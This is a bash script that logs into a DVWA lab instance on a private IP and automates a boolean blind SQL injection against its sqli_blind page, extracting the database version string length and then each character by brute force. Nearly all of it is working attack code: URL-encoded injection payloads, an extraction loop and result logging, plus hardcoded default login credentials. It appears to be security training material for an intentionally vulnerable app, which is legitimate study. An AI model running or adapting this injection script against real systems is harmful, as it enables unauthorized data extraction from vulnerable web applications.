#!/bin/bash

SECURITY="high" #security level
USER="admin" #username
PASS="password" #current password

rm cookies.txt #removes old file with cookies

#saves login cookies and login page html to local files
curl -s -c cookies.txt \
-b "security=$SECURITY" \
http://192.168.56.105/DVWA/login.php \
>login.html

TOKEN=$(grep -oP "name='user_token' value='\K[^']+" login.html) #saves user token variable found in login html
PHPSESSID=$(awk '$6=="PHPSESSID" {print $7}' cookies.txt) #saves PHP session ID found in cookies

#logs in using cookies and user token
curl -s -b cookies.txt \
-b "security=$SECURITY" \
-d "username=$USER&password=$PASS&user_token=$TOKEN&Login=Login" \
http://192.168.56.105/DVWA/login.php



#Attempts to find the length of the database server version string and saves result in local file
{
echo "Current security level: $SECURITY"
echo "Attempting to find the length of the database server version string"
echo "Trying length 1-50..."
echo "---------------------------------------------------"

for i in $(seq 1 50); do #Trying length 1-50
  PAYLOAD="1%27%20AND%20LENGTH%28%40%40version%29%3D$i%23" #URL-encoded payload
  RESPONSE=$(curl -s \
    -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
    "http://192.168.56.105/DVWA/vulnerabilities/sqli_blind/?id=$PAYLOAD&Submit=Submit")

  if echo "$RESPONSE" | grep -q "User ID exists in the database."; then #If the response includes "User ID exists in the database.", then it is True
    echo "---------------------------------------------------"
    LENGTH="$i"
    echo "Success! Length found: $LENGTH"
    break
  else #If the response does not include "User ID exists in the database.", then it is False
    echo "Tried $i -> no match"
  fi
done
}> /home/kali/sqliBlind_low1.log


#Attempts to find the name of the database server version string and saves result in local log file
{
echo "Current security level: $SECURITY"
echo "Attempting to find the name of the database server version string"
echo "String length: $LENGTH"
echo "---------------------------------------------------"

for ((pos=1; pos<=LENGTH; pos++)); do #For each position in the string
  for ((ascii=32; ascii<=126; ascii++)); do #Trying ASCII 32-126
    PAYLOAD="1%27%20AND%20ASCII%28SUBSTRING%28%40%40version%2C$pos%2C1%29%29%3D$ascii%23" #URL-encoded payload

    RESPONSE=$(curl -s \
      -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \ 
      "http://192.168.56.105/DVWA/vulnerabilities/sqli_blind/?id=$PAYLOAD&Submit=Submit")

    if echo "$RESPONSE" | grep -q "User ID exists in the database."; then #If the response includes "User ID exists in the database.", then it is True
      CHAR=$(printf "\\$(printf '%03o' $ascii)") #Get character from ASCII
      RESULT+="$CHAR" #Adds character to result string

      echo "Char at position $pos: $CHAR (ASCII $ascii)"
      break
    fi
  done
done  

echo "---------------------------------------------------"
echo "Version: $RESULT"
}> /home/kali/sqliBlind_low2.log
